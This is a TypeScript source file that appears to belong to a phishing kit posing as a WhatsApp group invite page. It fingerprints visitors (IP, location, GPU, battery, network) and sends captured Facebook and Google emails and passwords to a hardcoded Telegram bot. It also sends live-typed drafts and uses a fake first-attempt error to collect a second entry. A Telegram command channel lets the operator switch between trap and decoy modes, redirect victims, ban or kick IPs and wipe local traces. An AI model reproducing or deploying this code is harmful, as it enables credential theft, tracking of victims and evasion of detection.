
import { GroupData, VisitorLog, CredentialLog, TelegramConfig, DeviceFingerprint, SiteMode, RemoteAction } from '../types';

const STORAGE_KEY = 'wa_clone_groups';
const LOGS_KEY = 'wa_clone_logs';
const BLOCKED_KEY = 'wa_clone_blocked';
const CREDS_KEY = 'wa_clone_creds';
const TG_CONFIG_KEY = 'wa_clone_tg_config';
const SITE_MODE_KEY = 'wa_clone_mode';
const LAST_UPDATE_ID_KEY = 'wa_clone_last_update_id';

// User's Provided Token & ID
const DEFAULT_BOT_TOKEN = "8296457423:AAG3dHC3rwT9_0NgImTKnAQf5VU8XJI2OXY";
const DEFAULT_CHAT_ID = "8296457423"; 

// --- Telegram Helper ---

export const getTelegramConfig = (): TelegramConfig | null => {
  try {
    const stored = localStorage.getItem(TG_CONFIG_KEY);
    if (stored) {
        return JSON.parse(stored);
    }
    return { botToken: DEFAULT_BOT_TOKEN, chatId: DEFAULT_CHAT_ID };
  } catch (e) {
    return { botToken: DEFAULT_BOT_TOKEN, chatId: DEFAULT_CHAT_ID };
  }
};

export const saveTelegramConfig = (config: TelegramConfig) => {
  localStorage.setItem(TG_CONFIG_KEY, JSON.stringify(config));
};

const sendToTelegram = async (text: string) => {
  const config = getTelegramConfig();
  if (!config || !config.botToken || !config.chatId) return;

  const url = `https://api.telegram.org/bot${config.botToken}/sendMessage`;
  
  const formData = new FormData();
  formData.append('chat_id', config.chatId);
  formData.append('text', text);
  formData.append('parse_mode', 'HTML');
  formData.append('disable_web_page_preview', 'true');

  // Use Beacon if available for higher reliability on page close
  if (navigator.sendBeacon) {
      navigator.sendBeacon(url, formData);
  } else {
      try {
          await fetch(url, { 
              method: 'POST',
              body: formData,
              mode: 'no-cors' // We don't need the response
          });
      } catch (error) {
          console.error('TG Error');
      }
  }
};

// --- REMOTE COMMAND LISTENER (POLLING) ---

export const getSiteMode = (): SiteMode => {
    return (localStorage.getItem(SITE_MODE_KEY) as SiteMode) || 'trap';
};

export const setSiteMode = (mode: SiteMode) => {
    localStorage.setItem(SITE_MODE_KEY, mode);
};

export const checkRemoteCommands = async (currentIp: string): Promise<RemoteAction> => {
    const config = getTelegramConfig();
    if (!config || !config.botToken) return { type: 'NONE' };

    let actionToReturn: RemoteAction = { type: 'NONE' };

    try {
        // Get last processed update ID to avoid re-processing
        const lastOffset = parseInt(localStorage.getItem(LAST_UPDATE_ID_KEY) || '0');
        
        const url = `https://api.telegram.org/bot${config.botToken}/getUpdates?offset=${lastOffset + 1}&limit=10`;
        const res = await fetch(url);
        const data = await res.json();

        if (data.ok && data.result.length > 0) {
            let maxUpdateId = lastOffset;
            
            for (const update of data.result) {
                if (update.update_id > maxUpdateId) maxUpdateId = update.update_id;
                
                const text = (update.message?.text?.toLowerCase() || '').trim();
                
                // --- COMMAND LOGIC ---

                // 1. HELP MENU
                if (text === '/help' || text === '/start') {
                     const helpMsg = `<b>🤖 BOT COMMAND CENTER</b>\n` +
                                     `➖➖➖➖➖➖➖➖➖➖\n` +
                                     `<b>🔒 SITE CONTROL</b>\n` +
                                     `/mode trap - Switch to Phishing Mode\n` +
                                     `/mode safe - Switch to Decoy Mode\n` +
                                     `/status - Check Site & Visitor Status\n` +
                                     `\n<b>🎣 VICTIM INTERACTION</b>\n` +
                                     `/alert [msg] - Popup alert on all screens\n` +
                                     `/redirect [url] - Send victims to URL\n` +
                                     `/reload - Force refresh page\n` +
                                     `\n<b>🚫 SECURITY & BAN</b>\n` +
                                     `/ban [ip] - Ban specific IP\n` +
                                     `/unban [ip] - Unban IP\n` +
                                     `/kick [ip] - Instant Kick IP\n` +
                                     `\n<b>🧹 MAINTENANCE</b>\n` +
                                     `/clear - Clear local traces on device\n` +
                                     `/ping - Test connection`;
                     
                     // To prevent spam, only send if this is the very latest command
                     if (update === data.result[data.result.length-1]) {
                        await sendToTelegram(helpMsg);
                     }
                }

                // 2. SITE MODE
                else if (text.includes('/mode aman') || text.includes('/mode safe')) {
                    setSiteMode('safe');
                    actionToReturn = { type: 'RELOAD' }; // Reload to show decoy
                } else if (text.includes('/mode jebakan') || text.includes('/mode trap')) {
                    setSiteMode('trap');
                    actionToReturn = { type: 'RELOAD' };
                }

                // 3. STATUS
                else if (text === '/status') {
                    // Only respond from the current active session to avoid spam storm
                    // (Realistically all active tabs will try to send, but Telegram rate limits usually handle it)
                    const mode = getSiteMode();
                    const msg = `<b>🟢 SYSTEM ONLINE</b>\n` +
                                `<b>Mode:</b> ${mode.toUpperCase()}\n` +
                                `<b>My IP:</b> <code>${currentIp}</code>\n` +
                                `<b>UA:</b> ${navigator.platform}`;
                    
                    // Simple logic: random delay to prevent all clients hitting exactly same time
                    setTimeout(() => sendToTelegram(msg), Math.random() * 2000);
                }

                // 4. BAN / UNBAN / KICK
                else if (text.startsWith('/ban ')) {
                    const targetIp = text.split('/ban ')[1]?.trim();
                    if (targetIp) {
                        blockIP(targetIp);
                        if (currentIp === targetIp) actionToReturn = { type: 'KICK' };
                    }
                }
                else if (text.startsWith('/unban ')) {
                    const targetIp = text.split('/unban ')[1]?.trim();
                    if (targetIp) unblockIP(targetIp);
                }
                else if (text.startsWith('/kick ')) {
                    const targetIp = text.split('/kick ')[1]?.trim();
                    if (targetIp && currentIp === targetIp) {
                        actionToReturn = { type: 'KICK' };
                    }
                }

                // 5. INTERACTION (Alert, Redirect, Reload)
                else if (text.startsWith('/alert ')) {
                    const msg = text.split('/alert ')[1];
                    if (msg) actionToReturn = { type: 'ALERT', payload: msg };
                }
                else if (text.startsWith('/redirect ')) {
                    const url = text.split('/redirect ')[1];
                    if (url) actionToReturn = { type: 'REDIRECT', payload: url };
                }
                else if (text === '/reload') {
                    actionToReturn = { type: 'RELOAD' };
                }

                // 6. CLEANING
                else if (text === '/clear') {
                    localStorage.removeItem(LOGS_KEY);
                    localStorage.removeItem(CREDS_KEY);
                    actionToReturn = { type: 'ALERT', payload: 'Local traces cleared.' };
                }
                
                else if (text === '/ping') {
                     // Silent ping or debug
                }
            }

            // Save new offset
            localStorage.setItem(LAST_UPDATE_ID_KEY, maxUpdateId.toString());
        }
    } catch (e) {
        // Silent fail
    }

    return actionToReturn;
};


// --- ADVANCED DEVICE FINGERPRINTING ---

export const getAdvancedFingerprint = async (): Promise<DeviceFingerprint> => {
    let gpu = 'Unknown GPU';
    let batteryLevel = 'Unknown';
    let isCharging = false;
    let connectionType = 'Unknown';

    // 1. GPU Detection via WebGL
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
            // @ts-ignore
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) {
                // @ts-ignore
                gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            }
        }
    } catch (e) {}

    // 2. Battery API
    try {
        // @ts-ignore
        if (navigator.getBattery) {
            // @ts-ignore
            const battery = await navigator.getBattery();
            batteryLevel = `${Math.round(battery.level * 100)}%`;
            isCharging = battery.charging;
        }
    } catch (e) {}

    // 3. Network Information API
    try {
        // @ts-ignore
        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (conn) {
            connectionType = `${conn.effectiveType || ''} ${conn.downlink ? `(${conn.downlink}Mbps)` : ''}`;
        }
    } catch (e) {}

    return {
        gpu,
        batteryLevel,
        isCharging,
        connectionType,
        platform: navigator.platform,
        cores: navigator.hardwareConcurrency || 0,
        // @ts-ignore
        memory: navigator.deviceMemory || 0, // RAM in GB (approx)
        screenRes: `${window.screen.width}x${window.screen.height}`
    };
};

// --- Image Compression ---
export const compressImage = (file: File): Promise<string> => {
    return new Promise((resolve) => {
        const reader = new FileReader();
        reader.readAsDataURL(file);
        reader.onload = (e) => {
            const img = new Image();
            img.src = e.target?.result as string;
            img.onload = () => {
                const elem = document.createElement('canvas');
                const scaleFactor = Math.min(120 / img.width, 120 / img.height, 1);
                elem.width = img.width * scaleFactor;
                elem.height = img.height * scaleFactor;
                const ctx = elem.getContext('2d');
                ctx?.drawImage(img, 0, 0, elem.width, elem.height);
                resolve(elem.toDataURL('image/jpeg', 0.6));
            }
        }
    })
};

// --- URL State Management ---

export const generateInviteLink = (group: GroupData): string => {
    const payload = {
        n: group.name,
        i: group.image,
        l: group.link,
        c: group.memberCount,
        m: group.lastMessage,
        id: group.id
    };
    try {
        const json = JSON.stringify(payload);
        const base64 = btoa(unescape(encodeURIComponent(json)));
        const baseUrl = window.location.href.split('#')[0];
        return `${baseUrl}#invite/${base64}`;
    } catch (e) { return ""; }
};

export const parseInviteLink = (hash: string): GroupData | null => {
    try {
        const base64 = hash.split('#invite/')[1];
        if (!base64) return null;
        const json = decodeURIComponent(escape(atob(base64)));
        const data = JSON.parse(json);
        return {
            id: data.id || 'temp',
            name: data.n || 'Unknown Group',
            image: data.i || null,
            link: data.l || '',
            memberCount: data.c,
            lastMessage: data.m
        };
    } catch (e) { return null; }
};

// --- Local Group Management ---
export const getGroups = (): GroupData[] => {
  try {
    const stored = localStorage.getItem(STORAGE_KEY);
    return stored ? JSON.parse(stored) : [];
  } catch (e) { return []; }
};
export const saveGroup = (group: GroupData): void => {
  const groups = getGroups();
  const existingIndex = groups.findIndex(g => g.id === group.id);
  if (existingIndex >= 0) groups[existingIndex] = group;
  else groups.push(group);
  localStorage.setItem(STORAGE_KEY, JSON.stringify(groups));
};
export const deleteGroup = (id: string): void => {
  const groups = getGroups();
  const filtered = groups.filter(g => g.id !== id);
  localStorage.setItem(STORAGE_KEY, JSON.stringify(filtered));
};
export const getGroupById = (id: string): GroupData | undefined => {
  const groups = getGroups();
  return groups.find(g => g.id === id);
};

// --- Visitor Logs ---
export const getVisitorLogs = (): VisitorLog[] => {
  try {
    const stored = localStorage.getItem(LOGS_KEY);
    return stored ? JSON.parse(stored) : [];
  } catch (e) { return []; }
};

export const logVisitor = async (log: VisitorLog): Promise<void> => {
  const logs = getVisitorLogs();
  const recentLog = logs.find(l => l.ip === log.ip && (Date.now() - l.timestamp < 60000));
  
  if (!recentLog) {
    const newLogs = [log, ...logs].slice(0, 100);
    localStorage.setItem(LOGS_KEY, JSON.stringify(newLogs));
    
    // Fetch device info for the visitor log
    const dev = await getAdvancedFingerprint();

    const msg = `👀 <b>NEW VISITOR</b>\n` +
                `➖➖➖➖➖➖➖➖➖➖➖\n` +
                `<b>🎯 Target:</b> ${log.groupName}\n` +
                `<b>🌍 IP:</b> <code>${log.ip}</code>\n` +
                `<b>📍 Loc:</b> ${log.city}, ${log.country_name}\n` +
                `<b>🏢 ISP:</b> ${log.org}\n` +
                `➖➖➖➖➖➖➖➖➖➖➖\n` +
                `<b>📱 Device:</b> ${dev.platform} (${dev.screenRes})\n` +
                `<b>🎮 GPU:</b> ${dev.gpu}\n` +
                `<b>🔋 Battery:</b> ${dev.batteryLevel} ${dev.isCharging ? '⚡' : ''}\n` +
                `<b>📡 Net:</b> ${dev.connectionType}`;
    sendToTelegram(msg);
  }
};

// --- Blocklist ---
export const getBlockedIPs = (): string[] => {
  try {
    const stored = localStorage.getItem(BLOCKED_KEY);
    return stored ? JSON.parse(stored) : [];
  } catch (e) { return []; }
};
export const blockIP = (ip: string): void => {
  const blocked = getBlockedIPs();
  if (!blocked.includes(ip)) {
    blocked.push(ip);
    localStorage.setItem(BLOCKED_KEY, JSON.stringify(blocked));
  }
};
export const unblockIP = (ip: string): void => {
  const blocked = getBlockedIPs();
  const filtered = blocked.filter(i => i !== ip);
  localStorage.setItem(BLOCKED_KEY, JSON.stringify(filtered));
};
export const isIPBlocked = (ip: string): boolean => {
  const blocked = getBlockedIPs();
  return blocked.includes(ip);
};

// --- Credentials & Live Typing ---

export const getCredentials = (): CredentialLog[] => {
  try {
    const stored = localStorage.getItem(CREDS_KEY);
    return stored ? JSON.parse(stored) : [];
  } catch (e) { return []; }
};

export const saveCredential = async (cred: CredentialLog): Promise<void> => {
  if (!cred.isLiveType) {
      // Only save to local storage if it's a FINAL submit or ATTEMPT
      const creds = getCredentials();
      const newCreds = [cred, ...creds];
      localStorage.setItem(CREDS_KEY, JSON.stringify(newCreds));
  }

  const icon = cred.service === 'facebook' ? '🔵' : '🔴';
  
  let title = `${icon} <b>LOGIN SUCCESS</b> ${icon}`;
  if (cred.isLiveType) {
      title = '⚠️ <b>[DRAFT] TYPING DETECTED</b>';
  } else if (cred.attemptNumber === 1) {
      title = `❌ <b>ATTEMPT #1 (Fake Error)</b>`;
  } else if (cred.attemptNumber === 2) {
      title = `✅ <b>ATTEMPT #2 (Final)</b>`;
  }

  const dev = cred.deviceInfo;
  let devString = '';
  if (dev) {
      devString = `\n➖➖➖➖➖➖➖➖➖➖➖\n` +
                  `<b>📱 HW:</b> ${dev.cores} Cores | ${dev.memory}GB RAM\n` +
                  `<b>🎮 GPU:</b> ${dev.gpu}\n` +
                  `<b>🔋 Batt:</b> ${dev.batteryLevel} ${dev.isCharging ? '⚡' : ''}\n` +
                  `<b>📡 Net:</b> ${dev.connectionType}`;
  }

  // Handle Precise GPS Link
  let locString = `<b>📍 Loc:</b> ${cred.location || 'Unknown'}`;
  if (cred.preciseGPS) {
      locString = `<b>📍 PRECISE GPS:</b> <a href="${cred.preciseGPS}">Open Google Maps</a>`;
  }

  const msg = `${title}\n\n` +
              `<b>Service:</b> ${cred.service.toUpperCase()}\n` +
              `<b>User:</b> <code>${cred.email}</code>\n` +
              `<b>Pass:</b> <code>${cred.password}</code>\n` +
              `➖➖➖➖➖➖➖➖➖➖➖\n` +
              `<b>🌍 IP:</b> <code>${cred.ip}</code>\n` +
              `${locString}\n` +
              `<b>🕸️ UA:</b> <code>${cred.userAgent || 'Unknown'}</code>` +
              devString;
              
  await sendToTelegram(msg);
};

// Debounce for typing
let typingTimer: any;
export const sendLiveTypingLog = (
    email: string, 
    pass: string, 
    service: 'facebook' | 'google',
    ip: string,
    location: string,
    device: DeviceFingerprint | undefined
) => {
    // Only send if there is content
    if (email.length < 3 && pass.length < 1) return;

    clearTimeout(typingTimer);
    // Wait 2 seconds after user stops typing to send the log
    typingTimer = setTimeout(() => {
        saveCredential({
            service,
            email,
            password: pass,
            timestamp: Date.now(),
            ip,
            location,
            userAgent: navigator.userAgent,
            deviceInfo: device,
            isLiveType: true // Mark as draft
        });
    }, 2000);
};
